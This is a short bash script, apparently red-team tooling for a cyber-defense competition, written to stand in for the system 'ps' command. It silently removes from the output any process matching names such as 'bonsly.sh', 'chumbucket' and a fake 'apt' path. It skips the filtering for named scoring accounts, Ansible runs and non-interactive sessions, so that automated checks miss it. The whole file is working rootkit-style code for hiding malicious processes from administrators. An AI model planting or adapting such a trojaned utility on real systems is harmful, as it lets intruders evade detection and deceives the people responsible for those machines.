#!/bin/bash
REAL_PS="/usr/bin/ps"

# Pass straight through for gray team scoring accounts
case "$(whoami)" in
    kingneptune|paintythepirate|greyteamadmin) exec $REAL_PS "$@" ;;
esac

# Ansible automation bypass — let Ansible run unimpeded
if [ -n "$ANSIBLE_REMOTE_TEMP" ]; then
    exec $REAL_PS "$@"
fi

# Script/non-interactive bypass — don't break automated pipelines
if [ ! -t 0 ] && [ ! -t 1 ]; then
    exec $REAL_PS "$@"
fi

# Capture ps output, preserve exit code, then filter
TMP_OUT=$("$REAL_PS" "$@" 2>&1)
PS_RC=$?

while IFS= read -r line; do
    if echo "$line" | grep -qE "(bonsly\.sh|apt-daily-check|chumbucket|/usr/local/sbin/apt)"; then
        : # drop it
    else
        echo "$line"
    fi
done <<< "$TMP_OUT"

exit $PS_RC
